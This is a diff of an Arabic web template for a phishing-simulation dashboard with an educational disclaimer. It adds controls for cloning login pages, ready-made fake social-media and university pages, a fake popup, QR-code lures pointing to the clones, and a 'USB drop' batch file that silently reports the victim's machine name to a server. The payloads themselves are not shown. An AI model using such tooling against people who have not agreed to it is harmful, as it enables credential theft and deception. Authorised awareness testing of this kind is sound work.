@@ -1,5 +1,189 @@
-<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8">
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>الاختبار التعليمي</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet"><link rel="stylesheet" href="/static/style.css"></head>
-    <body>{% include 'base_nav.html' %}<main class="container py-5"><div class="row g-4"><div class="col-lg-6">
-            <div class="card"><div class="card-body"><h3>نسخ تدريبي لموقع</h3><input id="cloneUrl" class="form-control mb-2" placeholder="https://example.com/login"><input id="cloneName" class="form-control mb-2" placeholder="scenario_name"><button class="btn btn-danger w-100" onclick="cloneSite()">إنشاء نسخة تدريبية</button><div id="cloneResult" class="mt-3"></div></div></div></div><div class="col-lg-6"><div class="card"><div class="card-body"><h3>قوالب جاهزة</h3><a class="btn btn-outline-primary m-1" target="_blank" href="/social/facebook">Facebook</a><a class="btn btn-outline-danger m-1" target="_blank" href="/social/instagram">Instagram</a><a class="btn btn-outline-info m-1" target="_blank" href="/social/linkedin">LinkedIn</a><a class="btn btn-outline-dark m-1" target="_blank" href="/social/university">University</a></div></div></div></div><div class="card mt-4"><div class="card-body"><h3>النسخ الموجودة</h3>{% if clones %}<ul>{% for c in clones %}<li><a target="_blank" href="/view-clone/{{c.clone_name}}">{{c.clone_name}}</a> <button class="btn btn-sm btn-outline-danger" onclick="deleteClone('{{c.clone_name}}')">حذف</button></li>{% endfor %}</ul>{% else %}<p>لا توجد نسخ بعد.</p>{% endif %}</div></div></main><script src="/static/script.js"></script></body></html>
+    <title>الاختبار التعليمي | SET-CDP</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body style="background: #f8fafc;">
+
+{% include 'base_nav.html' %}
+
+<main class="container py-5">
+    <div class="alert alert-warning shadow-sm border-warning mb-4">
+        <strong><i class="fas fa-exclamation-triangle"></i> تنويه أمني:</strong> نحن غير مسؤولين عن أي استخدام غير قانوني لهذه الأدوات. تأكد من الحصول على إذن صريح قبل إجراء أي اختبار اختراق. هذه الأدوات مخصصة لأغراض تعليمية فقط!
+    </div> 
+
+    <div class="row">
+        <div class="col-md-6 mb-4">
+            <div class="card shadow-sm h-100 border-primary">
+                <div class="card-body">
+                    <h3 class="mb-3 text-primary"><i class="fas fa-clone"></i> استنساخ  لموقع</h3>
+                    <div class="mb-3">
+                        <label class="form-label fw-bold">الرابط المستهدف:</label>
+                        <input id="cloneUrl" class="form-control" placeholder="https://example.com/login">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label fw-bold">اسم السيناريو:</label>
+                        <input id="cloneName" class="form-control" placeholder="مثال: university_test">
+                    </div>
+                    <button class="btn btn-primary w-100" onclick="cloneSite()"><i class="fas fa-magic"></i> إنشاء نسخة اختراق</button>
+                    <pre id="cloneResult" class="mt-3 text-success fw-bold"></pre>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-6 mb-4">
+            <div class="card shadow-sm h-100 border-success">
+                <div class="card-body">
+                    <h3 class="mb-3 text-success"><i class="fas fa-layer-group"></i> القوالب الجاهزة</h3>
+                    <p class="text-muted">اختر أحد السيناريوهات الجاهزة لبدء الاختبار الفوري:</p>
+                    <div class="d-grid gap-2">
+                        <a class="btn btn-outline-primary" target="_blank" href="/social/facebook"><i class="fab fa-facebook"></i>  Facebook</a>
+                        <a class="btn btn-outline-danger" target="_blank" href="/social/instagram"><i class="fab fa-instagram"></i>  Instagram</a>
+                        <a class="btn btn-outline-info" target="_blank" href="/social/linkedin"><i class="fab fa-linkedin"></i>  LinkedIn</a>
+                        <a class="btn btn-outline-secondary" target="_blank" href="/social/university"><i class="fas fa-university"></i>  بوابة الجامعة</a>
+                        <a class="btn btn-outline-dark" target="_blank" href="/social/fake_popup"><i class="fas fa-window-restore"></i> النافذة المنبثقة الوهمية (UI Redressing)</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-md-6 mb-4">
+            <div class="card shadow-sm h-100 border-warning">
+                <div class="card-body">
+                    <h3 class="mb-3 text-warning"><i class="fas fa-qrcode"></i> اداة التصيد (Quishing)</h3>
+                    <p class="text-muted" style="font-size: 14px;">قم بتوليد رمز QR يوجه الضحية إلى إحدى نسخ الاختراق لاختبار الوعي عند استخدام الهواتف.</p>
+                    <div class="input-group mb-3">
+                        <input type="text" id="qrUrlInput" class="form-control" placeholder="ضع الرابط هنا...">
+                        <button class="btn btn-warning" onclick="generateQR()">توليد الرمز</button>
+                    </div>
+                    
+                    <div id="qrResult" class="text-center mt-3" style="display: none;">
+                        <img id="qrImage" src="" alt="QR Code" class="img-fluid border p-2 bg-white rounded shadow-sm" style="max-width: 180px;">
+                        <p class="mt-2 text-success fw-bold small"><i class="fas fa-check-circle"></i> الرمز جاهز للمسح الكاميرا</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-6 mb-4">
+            <div class="card shadow-sm h-100 border-danger">
+                <div class="card-body">
+                    <h3 class="mb-3 text-danger"><i class="fas fa-usb"></i> محاكاة هجوم مادي (USB Drop)</h3>
+                    <p class="text-muted" style="font-size: 14px;">
+                        ينشئ النظام ملف (Batch) يبدو هاماً. عند فتحه، يرسل تنبيهاً صامتاً يحمل اسم جهاز الضحية كإثبات للاختراق.
+                    </p>
+                    <label class="form-label fw-bold">رابط السيرفر للاستقبال:</label>
+                    <input type="text" id="usbServerUrl" class="form-control mb-3" placeholder="http://127.0.0.1:5000">
+                    <button class="btn btn-danger w-100" onclick="generateUSB()"><i class="fas fa-download"></i> إنشاء وتحميل ملف الاختبار</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card shadow-sm border-secondary mt-2 mb-5">
+        <div class="card-body">
+            <h3 class="mb-3 text-secondary"><i class="fas fa-server"></i> روابط النسخ التي قمت بإنشائها</h3>
+            {% if clones %}
+            <div class="list-group">
+                {% for c in clones %}
+                <div class="list-group-item d-flex justify-content-between align-items-center">
+                    <div>
+                        <a target="_blank" href="/view-clone/{{ c.clone_name }}" class="fw-bold fs-5 text-decoration-none">
+                            {{ c.clone_name }}
+                        </a>
+                        <br>
+                        <small class="text-muted">الرابط الأصلي: {{ c.source_url }}</small>
+                    </div>
+                    <span class="badge bg-primary rounded-pill">نشط</span>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <p class="text-muted text-center my-3">لم تقم بإنشاء أي نسخ اختراق حتى الآن.</p>
+            {% endif %}
+        </div>
+    </div>
+</main>
+
+<script>
+// سكربت إنشاء QR Code
+function generateQR() {
+    const url = document.getElementById('qrUrlInput').value.trim();
+    if (!url) return alert('الرجاء إدخال رابط صالح');
+
+    fetch('/api/generate-qr', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: url })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            document.getElementById('qrImage').src = data.qr_image;
+            document.getElementById('qrResult').style.display = 'block';
+        } else {
+            alert('حدث خطأ: ' + data.error);
+        }
+    }).catch(err => console.error(err));
+}
+
+// سكربت إنشاء USB Drop
+function generateUSB() {
+    let url = document.getElementById('usbServerUrl').value.trim();
+    if (!url) { url = window.location.origin; }
+
+    fetch('/api/generate-usb', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ server_url: url })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            const blob = new Blob([data.payload], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = data.filename;
+            link.click();
+            alert('تم تحميل ملف الاختبار بنجاح.');
+        } else {
+            alert('حدث خطأ: ' + data.error);
+        }
+    }).catch(err => console.error(err));
+}
+
+// سكربت أداة الاستنساخ الموجود مسبقاً (تم ربطه بالزر)
+function cloneSite() {
+    const url = document.getElementById('cloneUrl').value;
+    const name = document.getElementById('cloneName').value;
+    if (!url) return alert('أدخل الرابط');
+    
+    document.getElementById('cloneResult').innerText = 'جاري الاستنساخ... يرجى الانتظار.';
+    
+    fetch('/api/clone-site', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: url, name: name })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if(data.success) {
+            document.getElementById('cloneResult').innerHTML = `نجاح! <a target="_blank" href="${data.url}">اضغط هنا لفتح النسخة</a>`;
+            setTimeout(()=> location.reload(), 2000);
+        } else {
+            document.getElementById('cloneResult').innerText = 'خطأ: ' + data.error;
+        }
+    });
+}
+</script>
+
+<script src="/static/script.js"></script>
+</body>
+</html>
